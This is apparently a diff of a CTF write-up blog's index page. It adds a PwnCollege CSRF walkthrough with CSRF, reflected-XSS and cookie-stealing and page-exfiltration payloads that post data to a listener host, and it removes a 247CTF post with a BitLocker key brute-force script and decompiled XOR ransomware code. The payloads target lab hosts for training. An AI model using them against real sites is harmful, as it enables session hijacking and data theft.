@@ -236,7 +236,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">184</span>
+          <span class="site-state-item-count">185</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -274,6 +274,181 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-CSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/PwnCollege/PwnCollege-CSRF/" class="post-title-link" itemprop="url">PwnCollege - CSRF</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-03-14 12:47:07 / Modified: 12:47:09" itemprop="dateCreated datePublished" datetime="2026-03-14T12:47:07+08:00">2026-03-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/PwnCollege/PwnCollege-CSRF/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-CSRF/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="csrf-1">CSRF 1</h2>
+<p>In this level, the application has a <code>/publish</code> route that
+uses a <code>GET</code> request to change the state of the application
+(publishing drafts). Since <code>GET</code> requests should ideally be
+idempotent and not change state, this is a classic CSRF
+vulnerability.</p>
+<h3 id="analysis">Analysis</h3>
+<p>The server-side code for the <code>/publish</code> route:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flask.session:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Log in first!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Vulnerability: State change via GET request with no CSRF protection</span></span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="exploit">Exploit</h3>
+<p>We can host a simple HTML page that redirects the victim (the admin)
+to the <code>/publish</code> endpoint. When the admin visits our page,
+their browser will automatically include their session cookies when
+following the redirect to <code>challenge.localhost</code>.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;http://challenge.localhost:80/publish&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Host the payload: <code>python3 -m http.server 1337</code></li>
+<li>Trigger the victim to visit your server:
+<code>/challenge/victim</code></li>
+<li>The admin’s drafts are now published. Fetch the flag:
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="csrf-level-2-post-based-csrf">CSRF Level 2: POST-based CSRF</h2>
+<p>The <code>/publish</code> route now requires a <code>POST</code>
+request. While this prevents simple link-based triggers, it doesn’t stop
+CSRF if there are no CSRF tokens or origin checks.</p>
+<h3 id="exploit-1">Exploit</h3>
+<p>We use an HTML form that automatically submits itself via JavaScript
+to perform the <code>POST</code> request on behalf of the admin.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;http://challenge.localhost:80/publish&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf-form&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Host the payload on port 1337.</li>
+<li>Run <code>/challenge/victim</code>.</li>
+<li>Login and check the published posts to find the flag.</li>
+</ol>
+<h2 id="csrf-level-3-reflected-xss">CSRF Level 3: Reflected XSS</h2>
+<p>This level introduces a reflected XSS vulnerability in the
+<code>/ephemeral</code> route. The <code>msg</code> parameter is
+rendered directly into the page without sanitization.</p>
+<h3 id="analysis-1">Analysis</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/ephemeral&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_ephemeral</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;You have received an ephemeral message!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        The message: <span class="subst">&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;(none)&quot;</span>)&#125;</span></span></span><br><span class="line"><span class="string">        &lt;hr&gt;&lt;form&gt;Craft an ephemeral message:&lt;input type=text name=msg action=/ephemeral&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="exploit-2">Exploit</h3>
+<p>We can inject a script tag through the <code>msg</code>
+parameter.</p>
+<p><strong>Payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> xss_payload = <span class="string">&quot;&lt;script&gt;alert(&#x27;PWNED&#x27;)&lt;/s&quot;</span> + <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(xss_payload);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="csrf-level-4-cookie-stealing-via-xss">CSRF Level 4: Cookie
+Stealing via XSS</h2>
+<p>Building on the previous level, we use the XSS vulnerability to steal
+the admin’s session cookie.</p>
+<h3 id="exploit-3">Exploit</h3>
+<p>We inject a script that reads <code>document.cookie</code> and sends
+it to our attacker-controlled listener.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> xss_payload =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;&lt;script&gt;fetch(&#x27;http://hacker.localhost:1338/?stolen_cookie=&#x27; + encodeURIComponent(document.cookie));&lt;/s&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(xss_payload);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Listen for the incoming cookie: <code>nc -l -p 1338</code></li>
+<li>Host the payload and trigger the victim.</li>
+<li>Once the cookie is captured (e.g., <code>auth=admin|...</code>), use
+it to access the flag: <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cookie <span class="string">&quot;auth=admin|...&quot;</span> <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="csrf-level-5-data-exfiltration-via-xss">CSRF Level 5: Data
+Exfiltration via XSS</h2>
+<p>In this final level, we use XSS to fetch the content of the admin’s
+home page (where the flag is displayed) and send the entire HTML back to
+our listener.</p>
+<h3 id="exploit-4">Exploit</h3>
+<p>The payload performs an internal <code>fetch('/')</code> while the
+admin is authenticated, then <code>POST</code>s the response body to the
+attacker.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> stage2_xss =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;&lt;script&gt;fetch(&#x27;/&#x27;).then(res =&gt; res.text()).then(html =&gt; fetch(&#x27;http://hacker.localhost:1338&#x27;, &#123;method: &#x27;POST&#x27;, body: html&#125;))&lt;/s&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(stage2_xss);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Listen for the POST data: <code>nc -l -p 1338</code></li>
+<li>Host the payload and trigger the victim.</li>
+<li>The flag will be contained within the HTML received by Netcat.</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -2131,176 +2306,6 @@ values</li>
 <li>https://www.hillelwayne.com/post/z3-examples/</li>
 <li>https://book.jorianwoltjer.com/cryptography/custom-ciphers/z3-solver</li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-encrypted-usb-drive/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/247CTF/247CTF-encrypted-usb-drive/" class="post-title-link" itemprop="url">247CTF - Encrypted USB Drive</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-03-03 21:23:44" itemprop="dateCreated datePublished" datetime="2026-03-03T21:23:44+08:00">2026-03-03</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/247CTF/247CTF-encrypted-usb-drive/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-encrypted-usb-drive/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="encrypted-usb-drive">Encrypted USB Drive</h1>
-<blockquote>
-<p>An important USB drive containing sensitive information has been
-encrypted by some new ransomware variant. Can you reverse the ransomware
-encryption function and recover the files?</p>
-</blockquote>
-<h2 id="initial-analysis">1. Initial Analysis</h2>
-<p>We are provided with a BitLocker-encrypted USB image
-(<code>encrypted_usb.dd</code>) and a large list of potential recovery
-keys (<code>recovery_keys_dump.txt</code>).</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ file encrypted_usb.dd</span><br><span class="line">encrypted_usb.dd: DOS/MBR boot sector, code offset 0x58+2, OEM-ID <span class="string">&quot;-FVE-FS-&quot;</span>, ... FAT (32 bit) ... NTFS ...</span><br></pre></td></tr></table></figure>
-<p>The goal is to find the correct recovery key, mount the image, and
-then deal with the “ransomware” that has encrypted the files inside.</p>
-<h2 id="bitlocker-decryption">2. BitLocker Decryption</h2>
-<h3 id="attempting-john-the-ripper">Attempting John the Ripper</h3>
-<p>First, I tried using <code>bitlocker2john</code> to extract the hash
-and then cracked it with the provided recovery keys.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">❯ bitlocker2john -i encrypted_usb.dd &gt; <span class="built_in">hash</span></span><br><span class="line">❯ john --wordlist=./recovery_keys_dump.txt --fork=6 <span class="built_in">hash</span></span><br><span class="line">...</span><br><span class="line">0 password hashes cracked, 4 left</span><br></pre></td></tr></table></figure>
-<p>John didn’t seem to find the key directly (possibly due to format
-mismatch or configuration). Instead of debugging the hash format, I
-moved to a more direct approach: brute-forcing the mount command using
-<code>dislocker</code>.</p>
-<h3 id="brute-forcing-with-dislocker">Brute-forcing with Dislocker</h3>
-<p>I wrote a simple bash script to iterate through the
-<code>recovery_keys_dump.txt</code> and attempt to mount the image.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">IMG_FILE=<span class="string">&quot;encrypted_usb.dd&quot;</span></span><br><span class="line">MNT_DIR=<span class="string">&quot;/mnt/bitlocker_img&quot;</span></span><br><span class="line">USB_DIR=<span class="string">&quot;/mnt/unlocked_usb&quot;</span></span><br><span class="line">KEYS_FILE=<span class="string">&quot;recovery_keys_dump.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$EUID</span> -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;[-] Error: This script must be run as root.&quot;</span></span><br><span class="line">   <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$MNT_DIR</span>&quot;</span> <span class="string">&quot;<span class="variable">$USB_DIR</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r key; <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># -p specifies the recovery password</span></span><br><span class="line">    <span class="keyword">if</span> dislocker -V <span class="string">&quot;<span class="variable">$IMG_FILE</span>&quot;</span> -p<span class="string">&quot;<span class="variable">$key</span>&quot;</span> -- <span class="string">&quot;<span class="variable">$MNT_DIR</span>&quot;</span> 2&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\n[+] Recovery Key Found: <span class="variable">$key</span>&quot;</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span> &lt; <span class="string">&quot;<span class="variable">$KEYS_FILE</span>&quot;</span></span><br></pre></td></tr></table></figure>
-<p>Running the script successfully identified the key:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Recovery Key Found: 334565-564641-129580-248655-292215-551991-326733-393679</span><br><span class="line"></span><br><span class="line">❯ <span class="built_in">sudo</span> mount /mnt/bitlocker_img/dislocker-file /mnt/unlocked_usb</span><br></pre></td></tr></table></figure>
-<h2 id="ransomware-analysis">3. Ransomware Analysis</h2>
-<p>Inside the mounted drive, we find several encrypted files and the
-ransomware binary itself:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ <span class="built_in">ls</span> -lh /mnt/unlocked_usb/</span><br><span class="line">total 3.2M</span><br><span class="line">-rwxrwxrwx 1 root root 474K Oct  8  2022 crypto_passphrase.png.xxx.crypt</span><br><span class="line">-rwxrwxrwx 1 root root  15K Oct  8  2022 cryptor</span><br><span class="line">-rwxrwxrwx 1 root root 9.2K Oct  8  2022 do_not_open.png.xxx.crypt</span><br><span class="line">-rwxrwxrwx 1 root root 133K Oct  8  2022 meeting_minutes.png.xxx.crypt</span><br><span class="line">-rwxrwxrwx 1 root root 889K Oct  8  2022 passwords.png.xxx.crypt</span><br><span class="line">-rwxrwxrwx 1 root root  386 Oct  8  2022 ransom.txt</span><br><span class="line">-rwxrwxrwx 1 root root 1.7M Oct  8  2022 salary_screenshot.png.xxx.crypt</span><br></pre></td></tr></table></figure>
-<p>The <code>ransom.txt</code> claims to use a “secure XOR encryption
-algorithm”.</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your files have been encrypted using a secure xor encryption algorithm and are completely unrecoverable!</span><br><span class="line">To decrypt your files, you need your secret encryption key.</span><br></pre></td></tr></table></figure>
-<h2 id="recovery-known-plaintext-attack">4. Recovery (Known Plaintext
-Attack)</h2>
-<p>Since the files are PNGs, we can perform a <strong>Known Plaintext
-Attack</strong>. We know that PNG files always start with the same
-8-byte magic header: <code>89 50 4E 47 0D 0A 1A 0A</code>.</p>
-<p>By XORing the first 8 bytes of an encrypted file with this known PNG
-header, we can recover the XOR key.</p>
-<p>Using <strong>CyberChef</strong>:</p>
-<ol type="1">
-<li>Input the first few bytes of
-<code>do_not_open.png.xxx.crypt</code>.</li>
-<li>XOR with the PNG magic bytes
-<code>89 50 4E 47 0D 0A 1A 0A</code>.</li>
-<li>The result reveals the key repeats as <code>66 63 6f 79</code>
-(ASCII: <code>fcoy</code>).</li>
-</ol>
-<p>Applying the XOR key <code>fcoy</code> to the entire file
-<code>do_not_open.png.xxx.crypt</code> recovers the original image
-containing the flag.</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{494f7cceb2baf33a0879543fe673blae}</span></span>
-<hr />
-<h2 id="deep-dive-reversing-the-cryptor-binary">5. Deep Dive: Reversing
-the <code>cryptor</code> Binary</h2>
-<p>I was curious about how the binary actually worked, so I threw it
-into IDA Pro.</p>
-<h3 id="main-logic">Main Logic</h3>
-<p>The program expects a 4-character key as a command-line argument. It
-then iterates through the current directory, looking for files with the
-<code>.xxx</code> extension.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// Key must be exactly 4 bytes long</span></span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">2</span> || <span class="built_in">strlen</span>(a2[<span class="number">1</span>]) != <span class="number">4</span> || (<span class="type">unsigned</span> <span class="type">int</span>)check_key_validity(a2[<span class="number">1</span>]) != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  dirp = opendir(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dirp )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (v5 = readdir(dirp)) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)is_target_extension(v5-&gt;d_name) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, v5-&gt;d_name);</span><br><span class="line">        <span class="built_in">strcat</span>(dest, <span class="string">&quot;.crypt&quot;</span>); <span class="comment">// Append .crypt to original name</span></span><br><span class="line">        encrypt_file(v5-&gt;d_name, dest, a2[<span class="number">1</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dirp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="encryption-function">Encryption Function</h3>
-<p>The encryption is indeed a simple byte-by-byte XOR using the 4-byte
-key provided.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt_file</span><span class="params">(<span class="type">char</span> *source, <span class="type">char</span> *dest, <span class="type">char</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  stream = fopen(source, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  v16 = fopen(dest, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Read chunks matching the key length</span></span><br><span class="line">    bytes_read = fread(ptr, <span class="number">1u</span>, key_len, stream);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; bytes_read; ++i )</span><br><span class="line">      *((_BYTE *)ptr + i) ^= key[i]; <span class="comment">// XOR logic</span></span><br><span class="line">    fwrite(ptr, <span class="number">1u</span>, bytes_read, v16);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( bytes_read == key_len );</span><br><span class="line"></span><br><span class="line">  fclose(stream);</span><br><span class="line">  fclose(v16);</span><br><span class="line">  <span class="keyword">return</span> ...;</span><br><span 